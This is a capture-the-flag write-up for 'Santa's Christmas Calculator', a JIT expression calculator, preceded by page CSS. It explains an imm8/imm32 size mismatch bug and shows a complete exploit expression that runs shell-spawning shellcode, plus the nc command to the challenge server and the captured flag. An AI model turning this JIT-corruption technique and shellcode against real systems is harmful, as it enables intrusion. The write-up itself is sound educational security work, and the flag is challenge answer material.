<style>
:root {
  color-scheme: dark;
  --bg: #020617;
  --fg: #e5e7eb;
  --fg-muted: #9ca3af;
  --accent: #38bdf8;
  --border-subtle: #1f2937;
}

/* Base page */
html, body {
  margin: 0;
  padding: 0;
  background: radial-gradient(circle at top left, #020617, #020617 40%, #020617 100%);
  color: var(--fg);
  font-family: system-ui, -apple-system, BlinkMacSystemFont, "SF Pro Text", "Segoe UI", sans-serif;
}

/* GitHub Pages wrappers */
.page-content, .wrapper, article, .post {
  background: transparent !important;
  max-width: 960px;
  margin: 0 auto;
  padding: 2.5rem 1.5rem 4rem;
}

/* Headings */
.post h1, .page-content h1, article h1 {
  font-size: 1.6rem;
  margin-bottom: 0.6rem;
}

.post h2, .page-content h2, article h2 {
  font-size: 1.1rem;
  margin-top: 1.8rem;
  margin-bottom: 0.6rem;
  color: var(--fg-muted);
}

/* Tables (optional, if you use them) */
table {
  border-collapse: collapse;
  width: 100%;
  font-size: 0.85rem;
  margin: 0.4rem 0 0.8rem;
  border-radius: 0.6rem;
  overflow: hidden;
}

th,
td {
  padding: 0.5rem 0.75rem;
  border-bottom: 1px solid var(--border-subtle);
  background-color: rgba(15, 23, 42, 0.9);
}

th {
  text-align: left;
  font-weight: 500;
  color: var(--fg-muted);
}

tbody tr:nth-child(even) td {
  background-color: rgba(15, 23, 42, 0.75);
}

tbody tr:last-child td {
  border-bottom: none;
}

/* Links */
a {
  color: var(--accent);
}

a:hover {
  text-decoration: none;
}

/* Code blocks */
pre,
code,
pre code,
.highlight,
.highlight pre,
.highlight code {
  background-color: rgba(15, 23, 42, 0.96) !important;
  color: var(--fg);
}

pre {
  border: 1px solid var(--border-subtle);
  padding: 0.85rem 1rem;
  border-radius: 0.5rem;
  overflow-x: auto;
  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}

code {
  padding: 0.1rem 0.25rem;
  border-radius: 0.25rem;
  font-family: SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
}
</style>

# Santa's Christmas Calculator writeup

## Overview
The service reads a single expression made of `+` and `-` with decimal integers, JIT-compiles it into native x86-64 code, executes it, and prints the result. The JIT uses RWX `mmap`, so if we can corrupt the generated code stream we can execute arbitrary instructions.

## Binary behavior
Key functions (from static analysis):
- `parse_ops`: parses the input into a linked list of operations `{ op, value, next }`. Only digits are allowed, and it supports an optional leading `+` or `-` for each number.
- `jit_ops`: allocates RWX memory and emits a tiny JIT program:
  - `xor rax, rax`
  - for each op: `add/sub rax, imm` (imm8 or imm32)
  - `ret`
- `main`: reads input with `scanf("%ms", &buf)`, builds ops, JITs, calls the JIT, prints the result, and loops.

The JIT code bytes are copied from `.rodata` using `memcpy`, and immediates are written into the code stream after each add/sub opcode.

## Bug
In `jit_ops`, the decision for opcode size and the decision for immediate size are inconsistent:
- If `value <= 0x80`, it emits the **imm8** form (`add/sub rax, imm8`), which is 3 bytes: `48 83 C0` or `48 83 E8`.
- It then decides how many immediate bytes to write with **`value <= 0x7f`**:
  - `<= 0x7f`: write 1 byte (correct for imm8).
  - `> 0x7f`: write 4 bytes (incorrect for imm8).

For `value = 0x80`, the JIT uses the imm8 opcode but writes a 4-byte immediate. The extra 3 bytes become executable code. This gives a controlled jump into attacker-supplied bytes that follow.

## Exploit strategy
1. Set `rax` to a safe RW address so the buggy opcode stream does not crash on unintended reads/writes. The `.bss` region at `0x404080` is writable.
2. Add `128` to trigger the mismatch and land execution in the following immediate stream.
3. Treat each subsequent 4-byte immediate as a tiny instruction chunk:
   - Bytes layout: `[ins0][ins1][0xEB][0x02]`
   - This executes two bytes of real code, then `jmp +2` to skip the fixed `add rax, imm32` opcode bytes that would otherwise execute.
4. Chain these 4-byte chunks to build a small shellcode:
   - Copy `/bin/sh\0` into the RWX buffer using `mov al, imm8; stosb`.
   - Build `argv` on the stack: push NULL, push pointer to `/bin/sh`, set `rsi = rsp`.
   - Set `rdi = ptr("/bin/sh")`, `rdx = 0`, `rax = 59`, `syscall`.

Because the JIT memory is RWX, this code executes directly.

## Working expression
The following expression triggers the bug and spawns a shell:

```
4210816+128+48979794+48967600+48992426+48980656+48992426+48982448+48992426+48983728+48992426+48967600+48992426+48985008+48992426+48982192+48992426+48955568+48992426+48979794+49004593+48992336+48992338+48979540+49009201+48970672+2425357583
```

Run:

```
nc kubenode.mctf.io 31088
<paste expression>
cat flag.txt
```

## Flag
```
MetaCTF{ju5t_1n_t1m3_t0_c4ptur3_th3_fl4g}
```

## Notes
- The binary is non-PIE, so static addresses like `0x404080` are stable.
- NX is enabled for the stack, but the JIT region is RWX (`mmap` with `PROT_READ|PROT_WRITE|PROT_EXEC`).
